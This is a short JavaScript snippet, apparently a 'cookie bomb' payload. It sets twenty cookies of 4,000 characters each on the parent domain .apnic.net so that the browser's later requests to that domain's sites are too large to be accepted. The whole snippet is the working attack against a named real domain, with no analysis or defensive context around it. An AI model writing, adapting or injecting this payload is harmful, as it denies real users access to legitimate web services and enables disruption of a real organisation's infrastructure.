for (let i = 0; i < 20; i++) {
  document.cookie = `bomb${i}=${"A".repeat(4000)}; Domain=.apnic.net; Path=/`;
}
